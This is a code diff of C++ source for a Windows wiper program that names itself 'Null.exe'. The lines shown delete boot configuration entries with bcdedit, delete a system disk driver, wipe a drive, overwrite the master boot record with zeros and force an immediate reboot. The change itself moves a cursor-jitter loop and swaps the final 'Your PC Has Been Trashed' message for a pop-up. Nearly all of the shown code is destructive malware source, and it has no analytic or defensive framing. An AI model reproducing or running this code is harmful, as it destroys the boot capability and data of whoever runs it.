@@ -8,15 +8,6 @@ using namespace std;
 int main()
 {
 
-	int X, Y;
-
-	srand(time(NULL));
-		while (1) {
-			Y = rand() % 801;
-			X = rand() % 601;
-			SetCursorPos(X, Y);
-		}
-
 	system("start bcdedit.exe /delete {current} /f");
 	system("start bcdedit.exe /delete {memdiag} /f");
 	system("start bcdedit.exe /delete {bootmgr} /f");
@@ -35,6 +26,15 @@ int main()
 	system("del C:\\Windows\\System32\\drivers\\disk.sys");
 	system("rd W: /s /q");
 
+	int X, Y;
+
+	srand(time(NULL));
+	while (1) {
+		Y = rand() % 801;
+		X = rand() % 601;
+		SetCursorPos(X, Y);
+	}
+
 	char mbrData[512];
 
 	ZeroMemory(&mbrData, (sizeof mbrData));
@@ -52,7 +52,7 @@ int main()
 
 	WriteFile(MBR,mbrData, 512, &write, NULL);
 
-	cout << "Your pc has been Trashed by Null.exe";
+	MessageBox(NULL, L"Your PC Has Been Trashed by Null.exe", L"Null.exe", MB_OK);
 	Sleep(2000);
 	system("start shutdown.exe -r -t 0");
 }
